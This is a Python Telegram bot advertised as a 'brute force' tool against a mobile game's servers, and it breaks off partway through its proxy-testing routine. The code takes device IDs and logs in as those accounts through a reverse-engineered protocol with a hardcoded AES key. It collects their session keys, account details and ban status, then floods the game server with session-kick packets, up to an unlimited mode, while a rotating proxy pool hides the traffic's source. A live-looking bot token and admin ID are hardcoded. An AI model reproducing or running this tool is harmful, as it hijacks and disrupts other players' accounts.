#!/usr/bin/env python3
# ===================================================================
# PREMIUM DEVID SEKER - TELEGRAM BRUTE FORCE v8.3
# Admin-only · up to 5 devices · proxy pool rotation · built-in tester
# ===================================================================
# SINGLE FILE — only external dep is proxies.txt (optional).
#   - proxies.txt in same dir as bot.py → pool loaded, rotation on
#   - no proxies.txt → runs direct (Termux default, works)
#   - /testproxy [workers] [timeout] [login] → sweep pool, 50 workers def
#   - login retries up to 3, fresh proxy each retry
# ===================================================================

import os, sys, time, json, socket, zlib, struct, threading, asyncio
from enum import Enum
from typing import Tuple, Dict, Any, Optional, List
from datetime import datetime, timezone, timedelta
from concurrent.futures import ThreadPoolExecutor

import zstandard as zstd
from Crypto.Cipher import AES

try:
    import socks  # PySocks
    HAVE_SOCKS = True
except ImportError:
    HAVE_SOCKS = False

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
from telegram.error import BadRequest
from telegram.request import HTTPXRequest

# ────────────────────────────────────────────────────────────────
# CONFIG
# ────────────────────────────────────────────────────────────────
BOT_TOKEN   = os.environ.get("BOT_TOKEN", "8857859353:AAFtJAEggihro0h5917MmiY6o1Mr9WDYLmY")
ADMIN_ID    = int(os.environ.get("ADMIN_ID", "8621676055"))
BOT_NAME    = "Premium DevID Seker · BF"
BOT_VERSION = "8.3"

TZ_WIB = timezone(timedelta(hours=7))

AES_KEY        = bytes.fromhex('2dd646797ec5a7ae563a37ce5e6d8576')
AES_IV         = b'\x00' * 16
SERVER_HOST    = 'login.ml.youngjoygame.com'
SERVER_PORT    = 30021
CLIENT_VERSION = '2.2.16.1232.1'
CHANNEL        = 'and_usa'
LANGUAGE       = 'en'

MAX_DEVICES     = 5
MAX_THREADS     = 5
LOGIN_RETRIES   = 5
PROXY_PROTOCOL  = "socks5"   # "socks5" or "http"
ROTATE_PER_KICK = False      # True → new proxy each kick, False → sticky per device

TEST_WORKERS  = 50
TEST_TIMEOUT  = 8.0

BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
PROXY_FILE  = os.path.join(BASE_DIR, "proxies.txt")
ALIVE_FILE  = os.path.join(BASE_DIR, "proxies_alive.txt")
DEAD_FILE   = os.path.join(BASE_DIR, "proxies_dead.txt")
LOG_DIR     = os.path.join(BASE_DIR, "BF_LOGS")
os.makedirs(LOG_DIR, exist_ok=True)
BF_LOG = os.path.join(LOG_DIR, "bruteforce_session.txt")

# ────────────────────────────────────────────────────────────────
# PROXY PARSER + POOL
# ────────────────────────────────────────────────────────────────
def _parse_proxy_line(line: str):
    """host:port | host:port:user:pass | user:pass@host:port"""
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    try:
        if "@" in line:
            creds, hostpart = line.rsplit("@", 1)
            user, _, pw = creds.partition(":")
            host, _, port = hostpart.partition(":")
            return (host.strip(), int(port), user or None, pw or None)
        parts = line.split(":")
        if len(parts) == 2:
            return (parts[0].strip(), int(parts[1]), None, None)
        if len(parts) == 4:
            return (parts[0].strip(), int(parts[1]),
                    parts[2].strip() or None, parts[3].strip() or None)
    except Exception:
        return None
    return None

def fmt_proxy(p) -> str:
    if not p:
        return "direct"
    h, port, u, _ = p
    return f"{h}:{port}" + (f" (u={u})" if u else "")

def fmt_proxy_line(p) -> str:
    h, port, u, pw = p
    if u:
        return f"{h}:{port}:{u}:{pw}"
    return f"{h}:{port}"

class ProxyPool:
    def __init__(self, entries):
        self.entries = entries
        self._lock = threading.Lock()
        self._idx  = 0
    def __len__(self): return len(self.entries)
    def get_next(self):
        if not self.entries: return None
        with self._lock:
            e = self.entries[self._idx % len(self.entries)]
            self._idx += 1
            return e

def load_proxies(path: str) -> ProxyPool:
    if not os.path.exists(path):
        return ProxyPool([])
    seen, entries = set(), []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for raw in f:
            e = _parse_proxy_line(raw)
            if not e: continue
            key = f"{e[0]}:{e[1]}:{e[2] or ''}"
            if key in seen: continue
            seen.add(key); entries.append(e)
    return ProxyPool(entries)

PROXY_POOL = load_proxies(PROXY_FILE)
print(f"[proxy] {'loaded ' + str(len(PROXY_POOL)) + ' endpoint(s)' if PROXY_POOL else 'pool empty — direct mode'}")

# sticky per-device proxy so one account kicks from one IP
_sticky_lock   = threading.Lock()
_sticky_proxy: Dict[str, Tuple] = {}

def proxy_for(device_id: str, rotate: bool = False):
    if not PROXY_POOL: return None
    with _sticky_lock:
        if rotate or device_id not in _sticky_proxy:
            _sticky_proxy[device_id] = PROXY_POOL.get_next()
        return _sticky_proxy[device_id]

def invalidate_proxy(device_id: str):
    with _sticky_lock:
        _sticky_proxy.pop(device_id, None)

def _open_socket(proxy, timeout=12):
    """Raw or SOCKS-wrapped socket, unconnected."""
    if proxy and HAVE_SOCKS:
        ph, pp, pu, pw = proxy
        kind = socks.SOCKS5 if PROXY_PROTOCOL == "socks5" else socks.HTTP
        s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        s.set_proxy(kind, ph, pp, username=pu, password=pw, rdns=True)
        s.settimeout(timeout)
        return s
    if proxy and not HAVE_SOCKS:
        raise RuntimeError("proxy configured but PySocks not installed")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    return s

# ────────────────────────────────────────────────────────────────
# RANK MAP
# ────────────────────────────────────────────────────────────────
def map_rank(p) -> str:
    if not p or not isinstance(p, (int, float)) or p <= 0:
        return "Unranked"
    p = int(p)
    if p >= 136:
        s = p - 136
        if s >= 100: return f"Mythical Immortal ({s}★)"
        if s >= 50:  return f"Mythical Glory ({s}★)"
        if s >= 25:  return f"Mythical Honor ({s}★)"
        return f"Mythic ({s}★)"
    for th, name, ds, dn in [
        (105, "Legend", 5, ["V","IV","III","II","I"]),
        (75,  "Epic",   5, ["V","IV","III","II","I"]),
        (45,  "Grandmaster", 5, ["V","IV","III","II","I"]),
        (25,  "Master", 4, ["IV","III","II","I"]),
        (10,  "Elite",  3, ["IV","III","II","I"]),
        (1,   "Warrior",3, ["III","II","I"]),
    ]:
        if p >= th:
            off = p - th
            di  = min(len(dn)-1, off // ds)
            st  = (off % ds) + 1
            return f"{name} {dn[di]} ({st}★)"
    return "Warrior III (1★)"

# ────────────────────────────────────────────────────────────────
# SDP PROTOCOL
# ────────────────────────────────────────────────────────────────
class SdpDataType(Enum):
    INTEGER_POSITIVE=0; INTEGER_NEGATIVE=1; FLOAT=2; DOUBLE=3
    STRING=4; LIST=5; DICT=6; STRUCT_BEGIN=7; STRUCT_END=8

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''; self.offset = 0
        if isinstance(data, bytes):
            self.data = data; self._unpack()
        elif data is not None:
            self.update(data); self._pack()

    def _pack(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for k, v in sorted(self.items()): self._pack_item(k, v)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])

    def _unpack(self):
        if not self.data: return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            k, v = self._unpack_item()
            if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END:
                break
            self[k] = v

    def _write_varint(self, n):
        r = bytearray()
        while n >= 0x80: r.append((n & 0x7F) | 0x80); n >>= 7
        r.append(n & 0x7F); return bytes(r)

    def _read_varint(self):
        n = 1; val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n); n += 1
        self.offset += n; return val

    def _pack_header(self, t, d):
        if t < 15: self.data += bytes([(d.value << 4) | t])
        else:      self.data += bytes([(d.value << 4) | 15]) + self._write_varint(t)

    def _pack_item(self, t, v):
        if isinstance(v, bool):
            self._pack_header(t, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_varint(1 if v else 0)
        elif isinstance(v, int):
            if v < 0:
                self._pack_header(t, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._write_varint(-v)
            else:
                self._pack_header(t, SdpDataType.INTEGER_POSITIVE)
                self.data += self._write_varint(v)
        elif isinstance(v, float):
            self._pack_header(t, SdpDataType.DOUBLE)
            self.data += self._write_varint(8) + struct.pack("<d", v)
        elif isinstance(v, (str, bytes)):
            self._pack_header(t, SdpDataType.STRING)
            e = v.encode('utf-8') if isinstance(v, str) else v
            self.data += self._write_varint(len(e)) + e
        elif isinstance(v, list):
            self._pack_header(t, SdpDataType.LIST)
            self.data += self._write_varint(len(v))
            for i in v: self._pack_item(0, i)
        elif isinstance(v, dict):
            if isinstance(v, SdpStruct):
                self._pack_header(t, SdpDataType.STRUCT_BEGIN)
                for k, x in sorted(v.items()): self._pack_item(k, x)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._pack_header(t, SdpDataType.DICT)
                self.data += self._write_varint(len(v))
                for k, x in sorted(v.items()):
                    self._pack_item(0, k); self._pack_item(0, x)

    def _unpack_item(self):
        if self.offset >= len(self.data): return 0, None
        h = self.data[self.offset]; t = h & 0xF; d = SdpDataType(h >> 4)
        self.offset += 1
        if t == 15: t = self._read_varint()
        if d == SdpDataType.INTEGER_POSITIVE: return t, self._read_varint()
        if d == SdpDataType.INTEGER_NEGATIVE: return t, -self._read_varint()
        if d == SdpDataType.DOUBLE:
            return t, struct.unpack("<d", self._read_varint().to_bytes(8,'little'))[0]
        if d == SdpDataType.STRING:
            l = self._read_varint(); r = self.data[self.offset:self.offset+l]; self.offset += l
            try:    return t, r.decode('utf-8')
            except: return t, r
        if d == SdpDataType.LIST:
            l = self._read_varint()
            return t, [self._unpack_item()[1] for _ in range(l)]
        if d == SdpDataType.DICT:
            l = self._read_varint(); res = {}
            for _ in range(l):
                _, k = self._unpack_item(); _, v = self._unpack_item(); res[k] = v
            return t, res
        if d == SdpDataType.STRUCT_BEGIN:
            res = {}
            while True:
                k, v = self._unpack_item()
                if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
                res[k] = v
            return t, SdpStruct(res)
        if d == SdpDataType.STRUCT_END: return t, SdpDataType.STRUCT_END
        return t, None

# ────────────────────────────────────────────────────────────────
# CONNECTION
# ────────────────────────────────────────────────────────────────
class BaseConn:
    def __init__(self, host, port, proxy=None):
        self.host = host; self.port = port; self.seq = 1
        self.sock = None; self.q = b''
        self.proxy = proxy
    def connect(self):
        self.sock = _open_socket(self.proxy)
        self.sock.connect((self.host, self.port))
    def cleanup(self):
        if self.sock:
            try: self.sock.close()
            except: pass
            self.seq = 1; self.sock = None
    def __enter__(self): self.connect(); return self
    def __exit__(self, *a): self.cleanup()
    def send_data(self, pid, sdp):
        pkt  = SdpStruct({0: pid, 1: self.seq, 5: sdp.data}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        self.sock.send(flags.to_bytes(4, 'big') + comp); self.seq += 1
    def recv_data(self):
        try:
            while len(self.q) < 4:
                d = self.sock.recv(4096)
                if not d: return None, None
                self.q += d
            flags = int.from_bytes(self.q[:4], 'big')
            sz = flags & 0xFFFFFF; ct = flags >> 24
            while len(self.q) < sz:
                d = self.sock.recv(4096)
                if not d: return None, None
                self.q += d
            data = self.q[4:sz]; self.q = self.q[sz:]
            if ct == 1:  data = zlib.decompress(data)
            elif ct == 16: data = zstd.decompress(data)
            elif ct in (2, 3, 18):
                c = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = c.decrypt(data[:-1] if len(data) % 16 else data).rstrip(b'\x00')
                if ct == 3:  data = zlib.decompress(data)
                elif ct == 18: data = zstd.decompress(data)
            r = SdpStruct(data); pid = r.get(0)
            if pid is None: return None, None
            body = r.get(6) or r.get(5)
            return (pid, SdpStruct(body)) if body and isinstance(body, bytes) else (pid, None)
        except socket.timeout: return -1, None
        except: return None, None

class GameConn(BaseConn):
    def __init__(self, dev, proxy=None):
        super().__init__(SERVER_HOST, SERVER_PORT, proxy=proxy)
        self.dev = dev
        raw = dev.strip()
        if raw.startswith(("and_", "ios_")): raw = raw[4:]
        self.imei    = raw[:32] if len(raw) >= 32 else raw
        self.android = raw[32:48] if len(raw) >= 48 else ""
        self.adid    = raw[48:] if len(raw) > 48 else ""
        self.acc = 0; self.skey = ''; self.zone = 0
        self.ghost = ''; self.gport = 0; self.cts = 0
        self.ban = "NORMAL"; self.last_pid = None

    def _cred_blob(self):
        return (f'gps_adid={self.adid}&android_id={self.android}'
                f'&device_unique_id={self.imei}')

    def login_srv(self) -> bool:
        if not self.sock or self.host != SERVER_HOST:
            self.cleanup()
            self.host, self.port = SERVER_HOST, SERVER_PORT
            self.connect()
        self.send_data(1, SdpStruct({
            0: self.dev, 1: self._cred_blob(),
            2: CLIENT_VERSION, 3: CHANNEL, 4: LANGUAGE
        }))
        for _ in range(4):
            pid, res = self.recv_data()
            self.last_pid = pid
            if pid in (-1, None): break
            if pid != 2 or not res: continue
            try:
                acc = res.get(0)
                sk  = res.get(1)
                if isinstance(sk, (bytes, bytearray)):
                    sk = sk.decode('utf-8', errors='ignore')
                zone_raw = res.get(2)
                if isinstance(zone_raw, list) and zone_raw:
                    zone = zone_raw[0]
                elif isinstance(zone_raw, int):
                    zone = zone_raw
                else:
                    zone = 0
                cts = res.get(19, 0)
                if acc and isinstance(sk, str) and sk and zone:
                    self.acc = int(acc); self.skey = sk
                    self.zone = int(zone)
                    self.cts = int(cts) if cts else 0
                    self.ban = "NORMAL"
                    return True
            except Exception:
                continue
        self.ban = f"LOGIN FAILED (PID {self.last_pid})"
        return False

    def get_gs(self) -> bool:
        self.send_data(5, SdpStruct({
            0: self.acc, 1: self.skey, 2: CLIENT_VERSION,
            5: self.zone, 6: CHANNEL
        }))
        pid, res = self.recv_data()
        if pid == 6 and res:
            try:
                h, p = str(res.get(1, '')).split(':')
                self.ghost = h; self.gport = int(p); return True
            except Exception:
                return False
        return False

    def conn_gs(self) -> bool:
        prev = self.proxy
        self.cleanup()
        self.host, self.port = self.ghost, self.gport
        self.proxy = prev
        self.connect()
        self.send_data(10001, SdpStruct({
            0: self.acc, 1: self.skey, 2: self.zone,
            4: CLIENT_VERSION, 13: CHANNEL, 15: self.dev
        }))
        for _ in range(5):
            pid, _ = self.recv_data()
            if pid == 10002: return True
            if pid in (-1, None): break
        return False

    def check_ban(self) -> str:
        try:
            self.send_data(10101, SdpStruct({0: 0, 2: 2}))
            for _ in range(3):
                pid, res = self.recv_data()
                if pid == 20001 and res and isinstance(res, dict) and 0 in res and isinstance(res[0], dict):
                    b = res[0]
                    self.ban = (f"BANNED (Reason: {b.get('ban_reason','Unknown')} "
                                f"| {b.get('endtime_day','0')}d {b.get('endtime_hour','0')}h)")
                    return self.ban
                if pid in (-1, None, 20002): break
        except: pass
        return self.ban

    def skin_info(self, r, z):
        try:
            self.send_data(10143, SdpStruct({0: int(r), 1: int(z)}))
            for _ in range(4):
                pid, res = self.recv_data()
                if pid in (-1, None): break
                if pid == 10144: return res
        except: pass
        return None

# ────────────────────────────────────────────────────────────────
# FETCH SESSION PROFILE — 3 retries, rotate proxy each attempt
# ────────────────────────────────────────────────────────────────
def fetch_session_profile(device_id: str, max_retries: int = LOGIN_RETRIES):
    last_err = "unknown"
    rotate   = False
    for attempt in range(max_retries):
        proxy = proxy_for(device_id, rotate=rotate)
        try:
            conn = GameConn(device_id, proxy=proxy)
            if not conn.login_srv():
                last_err = f"{conn.ban} [{fmt_proxy(proxy)}]"
                conn.cleanup(); rotate = True; time.sleep(0.5); continue
            if not conn.get_gs():
                last_err = f"get_gs failed [{fmt_proxy(proxy)}]"
                conn.cleanup(); rotate = True; time.sleep(0.5); continue
            if not conn.conn_gs():
                last_err = f"conn_gs failed [{fmt_proxy(proxy)}]"
                conn.cleanup(); rotate = True; time.sleep(0.5); continue

            skin_info = conn.skin_info(conn.acc, conn.zone)
            ban_stat  = conn.check_ban()

            acc, zone = conn.acc, conn.zone
            sess_key  = conn.skey
            gs_host, gs_port = conn.ghost, conn.gport
            cts = conn.cts
            conn.cleanup()

            sk = skin_info if isinstance(skin_info, dict) else {}
            nick      = sk.get(2) or f"Player_{acc}"
            level     = sk.get(3) or 1
            skin_cnt  = sk.get(10) if sk.get(10) is not None else 0
            hero_cnt  = sk.get(9)  if sk.get(9)  is not None else 0
            cur_rv    = sk.get(6, 0) or 0
            max_rv    = sk.get(15, 0) or cur_rv

            return {
                'device_id': device_id, 'account_id': acc,
                'session_key': sess_key, 'zone_id': zone,
                'creation_ts': cts,
                'game_host': gs_host, 'game_port': gs_port,
                'gs_info': f"{gs_host}:{gs_port}",
                'nickname': nick, 'level': level,
                'rank': map_rank(cur_rv),
                'highest_rank': map_rank(max_rv) if max_rv else map_rank(cur_rv),
                'skin_count': skin_cnt, 'hero_count': hero_cnt,
                'ban_status': ban_stat,
                'via_proxy': fmt_proxy(proxy),
            }, None
        except Exception as e:
            last_err = f"{e} [{fmt_proxy(proxy)}]"
            rotate = True
            time.sleep(0.5)
    invalidate_proxy(device_id)
    return None, last_err

# ────────────────────────────────────────────────────────────────
# SESSION KICK
# ────────────────────────────────────────────────────────────────
def send_session_kick(profile, timeout=6.0):
    t0 = time.time(); sock = None
    proxy = proxy_for(profile['device_id'], rotate=ROTATE_PER_KICK)
    try:
        sock = _open_socket(proxy, timeout=timeout)
        sock.connect((profile['game_host'], profile['game_port']))
        body = SdpStruct({
            0: profile['account_id'], 1: profile['session_key'],
            2: profile['zone_id'],    4: CLIENT_VERSION,
            13: CHANNEL,              15: profile['device_id']
        }).data
        pkt  = SdpStruct({0: 10001, 1: 1, 5: body}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        sock.send(flags.to_bytes(4, 'big') + comp)

        q = b''
        while len(q) < 4:
            d = sock.recv(4096)
            if not d: break
            q += d
        got_ack = False
        if len(q) >= 4:
            fl = int.from_bytes(q[:4], 'big'); sz = fl & 0xFFFFFF
            while len(q) < sz:
                d = sock.recv(4096)
                if not d: break
                q += d
            if len(q) >= sz: got_ack = True
        elapsed_ms = (time.time() - t0) * 1000
        sock.close()
        return True, elapsed_ms, ("ACK" if got_ack else "SENT")
    except socket.timeout:
        try: sock and sock.close()
        except: pass
        return False, (time.time() - t0) * 1000, "TIMEOUT"
    except Exception as e:
        try: sock and sock.close()
        except: pass
        return False, (time.time() - t0) * 1000, str(e)[:80]

# ────────────────────────────────────────────────────────────────
# PROXY TESTER (in-file)
# ────────────────────────────────────────────────────────────────
def _test_one_proxy(entry, timeout=TEST_TIMEOUT, protocol=PROXY_PROTOCOL, login_test=False):
    """TCP-connect (and optionally send a dummy PID-1) to login server via proxy."""
    if not HAVE_SOCKS:
        return (entry, False, 0.0, "PySocks missing")
    host, port, user, pw = entry
    t0 = time.time(); s = None
    try:
        kind = socks.SOCKS5 if protocol == "socks5" else socks.HTTP
        s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        s.set_proxy(kind, host, port, username=user, password=pw, rdns=True)
        s.settimeout(timeout)
        s.connect((SERVER_HOST, SERVER_PORT))
        connect_ms = (time.time() - t0) * 1000

        if not login_test:
            s.close()
            return (entry, True, connect_ms, "tcp-ok")

        try:
            dummy = "and_" + "0" * 64
            body = SdpStruct({0: dummy,
                              1: "gps_adid=x&android_id=y&device_unique_id=z",
                              2: CLIENT_VERSION, 3: CHANNEL, 4: LANGUAGE}).data
            pkt = SdpStruct({0: 1, 1: 1, 5: body}).data
            comp = zstd.compress(pkt)
            flags = (len(comp) + 4) | (16 << 24)
            s.send(flags.to_bytes(4, 'big') + comp)
            s.settimeout(timeout)
            data = s.recv(64)
            s.close()
            lat = (time.time() - t0) * 1000
            if data:
                return (entry, True, lat, f"login-reply({len(data)}b)")
            return (entry, False, lat, "no-reply")
        except Exception as e:
            try: s.close()
            except: pass
            return (entry, False, (time.time() - t0) * 1000, f"login-err:{str(e)[:40]}")
    except socket.timeout:
        try: s and s.close()
        except: pass
        return (entry, False, (time.time() - t0) * 1000, "timeout")
    except Exception as e:
        try: s and s.close()
        except: pass
        return (entry, False, (time.time() - t0) * 1000, str(e)[:60])

def test_proxy_pool(entries, workers=TEST_WORKERS, timeout=TEST_TIMEOUT,
                    protocol=PROXY_PROTOCOL, login_test=False,
                    on_progress=None, stop_flag=None):
    results = {"alive": [], "dead": [], "total": len(entries)}
    lock    = threading.Lock()
    done    = [0]

    def run(entry):
        if stop_flag and stop_flag.is_set(): return
        r = _test_one_proxy(entry, timeout, protocol, login_test)
        with lock:
            done[0] += 1
            (results["alive"] if r[1] else results["dead"]).append(r)
            if on_progress:
                try: on_progress(done[0], results["total"], len(results["alive"]))
                except: pass

    if not entries: return results
    with ThreadPoolExecutor(max_workers=min(workers, len(entries))) as ex:
        list(ex.map(run, entries))
    results["alive"].sort(key=lambda r: r[2])
    results["dead"].sort(key=lambda r: r[2])
    return results

def write_alive_dead(results, alive_path, dead_path):
    with open(alive_path, "w", encoding="utf-8") as f:
        for p, ok, lat, note in results["alive"]:
            f.write(fmt_proxy_line(p) + "\n")
    with open(dead_path, "w", encoding="utf-8") as f:
        for p, ok, lat, note in results["dead"]:
            f.write(f"# {note} lat={lat:.0f}ms  " + fmt_proxy_line(p) + "\n")

# ────────────────────────────────────────────────────────────────
# GLOBAL STATE
# ────────────────────────────────────────────────────────────────
active_jobs: Dict[int, Dict] = {}
pending:     Dict[int, Dict] = {}
job_lock = threading.Lock()
start_time = time.time()
_proxy_test_lock = threading.Lock()
_proxy_test_running = [False]

# ────────────────────────────────────────────────────────────────
# KEYBOARDS
# ────────────────────────────────────────────────────────────────
def kb_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚡ New BF Session", callback_data="bf_new")],
        [InlineKeyboardButton("🔬 Test Proxies",  callback_data="bf_testproxy")],
        [InlineKeyboardButton("📊 Stats",         callback_data="bf_stats"),
         InlineKeyboardButton("📖 Help",          callback_data="bf_help")],
    ])

def kb_mode():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🧪 1x Test",        callback_data="bf_mode:1")],
        [InlineKeyboardButton("⚡ 10x Standard",    callback_data="bf_mode:2")],
        [InlineKeyboardButton("🚀 50x Fast",        callback_data="bf_mode:3")],
        [InlineKeyboardButton("💥 100x Aggressive", callback_data="bf_mode:4")],
        [InlineKeyboardButton("♾️ Unlimited",       callback_data="bf_mode:5")],
        [InlineKeyboardButton("❌ Cancel",          callback_data="bf_cancel")],
    ])

def kb_stop(uid):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 Stop", callback_data=f"bf_stop:{uid}")]
    ])

def kb_back():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 Main Menu", callback_data="bf_back")]
    ])

MODES = {
    "1": ("🧪 1x Test",         1,   0.0),
    "2": ("⚡ 10x Standard",    10,  2.0),
    "3": ("🚀 50x Fast",        50,  1.0),
    "4": ("💥 100x Aggressive", 100, 0.5),
    "5": ("♾️ Unlimited",       0,   0.0),
}

# ────────────────────────────────────────────────────────────────
# JOB HELPERS
# ────────────────────────────────────────────────────────────────
def _edit(app, loop, chat_id, msg_id, text, kb=None):
    try:
        asyncio.run_coroutine_threadsafe(
            app.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id,
                text=text, parse_mode="Markdown", reply_markup=kb
            ), loop
        ).result(timeout=10)
    except Exception:
        pass

def _send(app, loop, chat_id, text, kb=None):
    try:
        asyncio.run_coroutine_threadsafe(
            app.bot.send_message(
                chat_id=chat_id, text=text,
                parse_mode="Markdown", reply_markup=kb
            ), loop
        ).result(timeout=15)
    except Exception:
        pass

# ────────────────────────────────────────────────────────────────
# BF JOB
# ────────────────────────────────────────────────────────────────
def run_bf_job(job, loop, app):
    uid      = job['user_id']; chat_id = job['chat_id']; msg_id = job['msg_id']
    devices  = job['devices']; loops = job['loops']; delay = job['delay']
    stop_ev  = job['stop_event']; mode_lbl = job['mode_label']

    pool_note = f"🌐 Pool: `{len(PROXY_POOL)}`" if PROXY_POOL else "🌐 Pool: `direct`"
    _edit(app, loop, chat_id, msg_id,
          f"🔍 *Verifying {len(devices)} device(s)*\n{pool_note} · retries `{LOGIN_RETRIES}`",
          kb_stop(uid))

    profiles: Dict[str, Optional[Dict]] = {}
    errors:   Dict[str, str] = {}

    def fetch(dev):
        p, err = fetch_session_profile(dev)
        profiles[dev] = p
        if err: errors[dev] = err

    with ThreadPoolExecutor(max_workers=min(MAX_THREADS, len(devices))) as ex:
        list(ex.map(fetch, devices))

    valid = {d: p for d, p in profiles.items() if p}

    lines = [f"🎯 *Targets Loaded* — {len(valid)}/{len(devices)} valid\n"]
    for d, p in valid.items():
        mark = "🔴" if 'ban' in str(p['ban_status']).lower() else "🟢"
        lines.append(f"{mark} *{p['nickname']}* (Lv.{p['level']})")
        lines.append(f"   🆔 `{p['account_id']}` · zone `{p['zone_id']}`")
        lines.append(f"   🏆 {p['rank']} · 🌐 `{p['gs_info']}`")
        lines.append(f"   🔌 via `{p.get('via_proxy','direct')}`")
    for d in devices:
        if d not in valid:
            lines.append(f"❌ `{d[:24]}…` — {errors.get(d,'login failed')}")
    lines.append("")
    lines.append(f"⚡ *{mode_lbl}* × delay `{delay}s` — starting…")
    _edit(app, loop, chat_id, msg_id, "\n".join(lines), kb_stop(uid))

    if not valid:
        first = (list(errors.values()) or ['—'])[0][:120]
        _send(app, loop, chat_id,
              f"❌ *No valid devices.*\nPool: `{len(PROXY_POOL)}`\nError: `{first}`",
              kb_back())
        with job_lock: active_jobs.pop(uid, None)
        return

    stats = {d: {'count':0,'ok':0,'fail':0,'lat_sum':0.0,'lat_n':0} for d in valid}
    stats_lock = threading.Lock()
    start_ts   = time.time()

    def kicker(dev, profile):
        lc = 0
        while not stop_ev.is_set():
            if loops > 0 and lc >= loops: break
            lc += 1
            ok, lat, _ = send_session_kick(profile)
            with stats_lock:
                s = stats[dev]; s['count'] += 1
                if ok: s['ok'] += 1
                else:  s['fail'] += 1
                s['lat_sum'] += lat; s['lat_n'] += 1
            if delay > 0 and not stop_ev.is_set():
                time.sleep(delay)

    threads = [threading.Thread(target=kicker, args=(d, p), daemon=True)
               for d, p in valid.items()]
    for t in threads: t.start()

    last_edit = 0.0
    while True:
        alive = any(t.is_alive() for t in threads)
        now   = time.time()
        if (now - last_edit) >= 2.5 or not alive:
            last_edit = now
            elapsed    = int(now - start_ts)
            total_c    = sum(s['count'] for s in stats.values())
            total_ok   = sum(s['ok']    for s in stats.values())
            total_fail = sum(s['fail']  for s in stats.values())
            speed      = total_c / max(elapsed, 1)
            head = (f"⚡ *BF Running* — `{elapsed}s` · `{speed:.2f}`/s · "
                    f"✅`{total_ok}` ❌`{total_fail}`\n")
            body = []
            for d, s in stats.items():
                p   = valid[d]
                avg = (s['lat_sum'] / s['lat_n']) if s['lat_n'] else 0
                ls  = f"{s['count']}/{loops}" if loops > 0 else f"{s['count']}/∞"
                body.append(f"👤 *{p['nickname']}* — {ls}")
                body.append(f"   ✅{s['ok']} ❌{s['fail']} ⚡{avg:.0f}ms")
            _edit(app, loop, chat_id, msg_id, head + "\n".join(body), kb_stop(uid))
        if not alive: break
        time.sleep(0.4)

    elapsed    = int(time.time() - start_ts)
    total_c    = sum(s['count'] for s in stats.values())
    total_ok   = sum(s['ok']    for s in stats.values())
    total_fail = sum(s['fail']  for s in stats.values())
    speed      = total_c / max(elapsed, 1)

    out = [f"🏁 *BF Complete* — {elapsed}s · {speed:.2f}/s", ""]
    for d, s in stats.items():
        p   = valid[d]
        avg = (s['lat_sum'] / s['lat_n']) if s['lat_n'] else 0
        pct = s['ok'] / max(s['count'], 1) * 100
        out.append(f"👤 *{p['nickname']}* · `{p['account_id']}`")
        out.append(f"   ✅ {s['ok']} ({pct:.0f}%) · ❌ {s['fail']} · ⚡{avg:.0f}ms")
    out += ["", f"*TOTAL*: `{total_c}` · ✅`{total_ok}` · ❌`{total_fail}`",
            "", "✨ *PREMIUM DEVID SEKER* · @Karl08901"]
    _edit(app, loop, chat_id, msg_id, "\n".join(out), kb_back())

    try:
        with open(BF_LOG, 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*54}\n")
            f.write(f"{datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S WIB')} | {mode_lbl}\n")
            f.write(f"Pool: {len(PROXY_POOL)}\n")
            for d, s in stats.items():
                p = valid[d]
                f.write(f"  {p['nickname']} ({p['account_id']}/{p['zone_id']}) "
                        f"via={p.get('via_proxy')} OK={s['ok']} Fail={s['fail']}\n")
            f.write(f"  Total={total_c} OK={total_ok} Fail={total_fail} {elapsed}s\n")
    except Exception:
        pass

    with job_lock: active_jobs.pop(uid, None)

# ────────────────────────────────────────────────────────────────
# PROXY TEST JOB
# ────────────────────────────────────────────────────────────────
def _progress_bar(done, total, alive, elapsed):
    pct    = done / total * 100 if total else 0
    filled = int(20 * done / total) if total else 0
    bar    = "█" * filled + "░" * (20 - filled)
    rate   = done / elapsed if elapsed > 0 else 0
    eta    = (total - done) / rate if rate > 0 else 0
    return (f"`{bar}` {pct:.1f}%\n\n"
            f"✅ Alive : `{alive}`\n"
            f"📦 Done  : `{done}/{total}`\n"
            f"⚡ Rate  : `{rate:.1f}/s`\n"
            f"⏱ ETA   : `{eta:.0f}s`")

def run_proxy_test_job(job, loop, app):
    uid     = job['user_id']; chat_id = job['chat_id']; msg_id = job['msg_id']
    entries = job['entries']; workers = job['workers']
    timeout = job['timeout']; login_test = job['login_test']
    stop_ev = job['stop_event']

    t_start = time.time(); last_edit = [0.0]

    def progress(done, total, alive):
        now = time.time()
        if (now - last_edit[0]) < 1.5 and done < total: return
        last_edit[0] = now
        text = (f"🔬 *Testing {total} proxies* · `{workers}` workers"
